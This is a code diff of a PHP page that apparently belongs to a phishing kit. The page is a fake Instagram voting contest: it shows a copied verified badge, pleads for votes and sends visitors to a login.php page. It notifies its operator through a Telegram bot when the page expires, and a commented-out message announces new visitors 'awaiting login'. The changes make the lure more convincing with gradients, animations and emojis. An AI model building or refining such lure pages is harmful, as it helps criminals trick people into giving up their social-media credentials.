@@ -3,10 +3,8 @@ if (!file_exists('contestant_config.php') || time() - filemtime('contestant_conf
     include 'sync_config.php'; // auto-fetch if older than 5 min
 }
 
-
 // Start the session first
 session_start();
-
 
 // Configuration files (should be moved to non-web-accessible directory)
 $configFiles = [
@@ -73,20 +71,14 @@ function sendTelegramMessage($botToken, $chatId, $message) {
 // Check expiration
 if ($currentTime > $setDate) {
     ob_start();
-    sendTelegramMessage($botToken, $chatId, "⏰ Page Expired
-Link: IG-VOTE
-Status: Expired
-RENEW NOW!");
+    sendTelegramMessage($botToken, $chatId, "⏰ Page Expired\nLink: IG-VOTE\nStatus: Expired\nRENEW NOW!");
     ob_end_clean();
     header('Location: 404');
     exit();
 }
 
 // // Send visitor message
-// sendTelegramMessage($botToken, $chatId, "👤 New Visitor
-// Link: IG-VOTE
-// Status: Active
-// Awaiting login...");
+// sendTelegramMessage($botToken, $chatId, "👤 New Visitor\n// Link: IG-VOTE\n// Status: Active\n// Awaiting login...");
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -102,26 +94,127 @@ RENEW NOW!");
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+        }
+        
         .translate-widget-container {
-            margin: 10px auto;
+            margin: 20px auto;
             width: 90%;
+            max-width: 400px;
             box-sizing: border-box;
         }
+        
         .custom-language-select {
             width: 100%;
-            padding: 8px;
+            padding: 12px 16px;
             font-size: 16px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            background: #fff;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(10px);
             appearance: none;
             -webkit-appearance: none;
             -moz-appearance: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
         }
+        
+        .custom-language-select:focus {
+            outline: none;
+            border-color: #8b5cf6;
+            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
+        }
+        
+        .vote-card {
+            background: linear-gradient(145deg, #ffffff, #f8fafc);
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .vote-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+        }
+        
+        .gradient-text {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .vote-button {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24, #ff9ff3, #54a0ff);
+            background-size: 300% 300%;
+            animation: gradientShift 3s ease infinite;
+            transition: all 0.3s ease;
+        }
+        
+        .vote-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(255, 107, 107, 0.4);
+        }
+        
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .floating {
+            animation: floating 3s ease-in-out infinite;
+        }
+        
+        @keyframes floating {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .sparkle {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .sparkle::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transform: rotate(45deg);
+            animation: sparkle 2s linear infinite;
+        }
+        
+        @keyframes sparkle {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+        
         @media (max-width: 600px) {
             .custom-language-select {
                 font-size: 14px;
-                padding: 6px;
+                padding: 10px 12px;
             }
         }
     </style>
@@ -136,10 +229,11 @@ RENEW NOW!");
         });
     </script>
 </head>
- <!-- Language Selector -->
-    <div class="translate-widget-container">
+<body class="font-poppins">
+    <!-- Language Selector -->
+    <div class="translate-widget-container floating">
         <select id="custom-language-select" class="custom-language-select">
-            <option value="">Select Language</option>
+            <option value="">🌍 Select Language</option>
             <option value="en|af">Afrikaans</option>
             <option value="en|sq">Albanian</option>
             <option value="en|am">Amharic</option>
@@ -289,34 +383,49 @@ RENEW NOW!");
             }, 1000);
         }
     </script>
-<body class="bg-gray-100 font-poppins">
+
     <div class="container mx-auto px-4 py-8">
-        <div class="bg-white rounded-lg shadow-lg overflow-hidden mb-8">
-            <div class="relative">
-                <img src="<?php echo $mainImage; ?>" alt="Main Image" class="w-full h-48 object-cover">
-                <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/70 to-transparent p-4">
-                    <h1 class="text-white text-2xl font-bold">THE PEOPLE'S PICK</h1>
+        <div class="vote-card mb-8">
+            <div class="relative sparkle">
+                <img src="<?php echo $mainImage; ?>" alt="Main Image" class="w-full h-64 object-cover">
+                <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-black/20 to-transparent"></div>
+                <div class="absolute bottom-0 left-0 right-0 p-6">
+                    <h1 class="text-white text-4xl font-bold mb-2 pulse-animation">🏆 THE PEOPLE'S PICK</h1>
+                    <p class="text-white/90 text-lg">✨ Your vote matters! Make it count! ✨</p>
                 </div>
             </div>
-            <div class="p-6">
-                <div class="flex items-center mb-4">
-                    <img src="https://i.postimg.cc/T1h8T8Jj/instagram-verified-tick-kxkwzn.png" alt="Verified Badge" class="w-12 h-12 rounded-full object-cover border-0">
-                    <div class="ml-4">
-                        <h2 class="text-xl font-bold"><?php echo htmlspecialchars($mainContestant['name']); ?> ●</h2>
-                        <p class="text-gray-600"><?php echo htmlspecialchars($mainContestant['votes']); ?> votes | Contestant <?php echo htmlspecialchars($mainContestant['position']); ?></p>
+            
+            <div class="p-8">
+                <div class="flex items-center mb-6">
+                    <div class="relative">
+                        <img src="https://i.postimg.cc/T1h8T8Jj/instagram-verified-tick-kxkwzn.png" alt="Verified Badge" class="w-16 h-16 rounded-full object-cover border-4 border-white shadow-lg pulse-animation">
+                        <div class="absolute -top-1 -right-1 w-6 h-6 bg-green-500 rounded-full border-2 border-white"></div>
+                    </div>
+                    <div class="ml-6">
+                        <h2 class="text-2xl font-bold gradient-text"><?php echo htmlspecialchars($mainContestant['name']); ?> ●</h2>
+                        <div class="flex items-center gap-2 mt-1">
+                            <span class="bg-gradient-to-r from-purple-500 to-pink-500 text-white px-3 py-1 rounded-full text-sm font-semibold">
+                                🗳️ <?php echo htmlspecialchars($mainContestant['votes']); ?> votes
+                            </span>
+                            <span class="bg-gradient-to-r from-blue-500 to-cyan-500 text-white px-3 py-1 rounded-full text-sm font-semibold">
+                                🏅 Position <?php echo htmlspecialchars($mainContestant['position']); ?>
+                            </span>
+                        </div>
                     </div>
                 </div>
                 
-                <p class="text-gray-700 mb-6">
-                    I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker, propelling me toward victory!
-                </p>
+                <div class="bg-gradient-to-r from-blue-50 to-purple-50 p-6 rounded-2xl mb-8 border border-purple-100">
+                    <p class="text-gray-700 text-lg leading-relaxed">
+                        🚀 <strong>I need your support!</strong> Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker, propelling me toward victory! 🌟
+                    </p>
+                </div>
                 
-                <div class="flex flex-col md:flex-row gap-4">
-                    <a href="login.php" class="flex items-center justify-center gap-2 bg-gradient-to-r from-purple-500 to-pink-500 text-white py-3 px-4 rounded-lg hover:from-purple-600 hover:to-pink-600 transition">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                <div class="flex flex-col md:flex-row gap-6">
+                    <a href="login.php" class="vote-button flex items-center justify-center gap-3 text-white py-4 px-8 rounded-2xl font-bold text-lg shadow-lg">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16">
                             <path d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.917 3.917 0 0 0-1.417.923A3.927 3.927 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.916 3.916 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.926 3.926 0 0 0-.923-1.417A3.911 3.911 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0h.003zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599.28.28.453.546.598.92.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.47 2.47 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.478 2.478 0 0 1-.92-.598 2.48 2.48 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233 0-2.136.008-2.388.046-3.231.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92.28-.28.546-.453.92-.598.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045v.002zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92zm-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217zm0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334z"/>
                         </svg>
-                        Vote on Instagram
+                        🎯 Vote on Instagram
                     </a>
                 </div>
             </div>
